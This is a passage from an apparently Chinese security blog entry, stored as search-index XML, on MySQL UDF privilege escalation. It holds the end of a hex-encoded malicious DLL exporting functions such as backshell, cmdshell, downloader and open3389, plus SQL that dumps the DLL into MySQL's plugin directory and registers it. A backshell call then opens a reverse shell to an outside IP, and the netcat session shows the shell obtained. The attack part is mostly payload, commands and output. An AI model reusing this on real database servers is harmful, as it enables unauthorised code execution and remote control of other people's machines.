03014000060290000b02400009016000060290000b0240000601b000060290000b0240000b01e000060290000b0240000a026000060290000b024000000000100020003000400050006000700080009000a000b000c000d000e000f0010001100120013001400150016001700180019001a001b001c001d005d990200699902007c9902008d99020099990200ac990200bd990200c3990200d0990200db990200e5990200f6990200059a02000e9a02001e9a02002c9a0200379a0200499a0200599a0200629a0200729a0200809a0200889a0200979a0200a49a0200ad9a0200bd9a0200cb9a0200d09a0200dc9a02004b696c6c50726f63657373004b696c6c50726f636573735f6465696e6974004b696c6c50726f636573735f696e69740050726f63657373566965770050726f63657373566965775f6465696e69740050726f63657373566965775f696e69740061626f75740061626f75745f6465696e69740061626f75745f696e6974006261636b7368656c6c006261636b7368656c6c5f6465696e6974006261636b7368656c6c5f696e697400636d647368656c6c00636d647368656c6c5f6465696e697400636d647368656c6c5f696e697400646f776e6c6f6164657200646f776e6c6f616465725f6465696e697400646f776e6c6f616465725f696e6974006f70656e33333839006f70656e333338395f6465696e6974006f70656e333338395f696e6974007265677265616400726567726561645f6465696e697400726567726561645f696e69740072656777726974650072656777726974655f6465696e69740072656777726974655f696e6974007368757400736875745f6465696e697400736875745f696e697400);</span><br><span class="line">create table Ghost(data LONGBLOB);</span><br><span class="line">insert into Ghost values(&quot;&quot;);</span><br><span class="line">update Ghost set data &#x3D; @a;</span><br><span class="line">select data from Ghost into DUMPFILE &#39;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#39;;</span><br></pre></td></tr></table></figure>

<p>成功上传后执行blackshell函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;#导入blackshell函数</span><br><span class="line">select backshell(&#39;192.168.220.141&#39;,12345);#反弹shell</span><br></pre></td></tr></table></figure>

<p>执行成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lv@ubuntu:~$ nc -vv -l -p 12345</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12345)</span><br><span class="line">Connection from [192.168.220.141] port 12345 [tcp&#x2F;*] accepted (family 2, sport 7157)</span><br><span class="line">Microsoft Windows [�汾 10.0.17134.885]</span><br><span class="line">(c) 2018 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\phpStudy\PHPTutorial\MySQL\data&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">desktop-6sk3as1\123456</span><br><span class="line"></span><br><span class="line">C:\phpStudy\PHPTutorial\MySQL\data&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
</search>
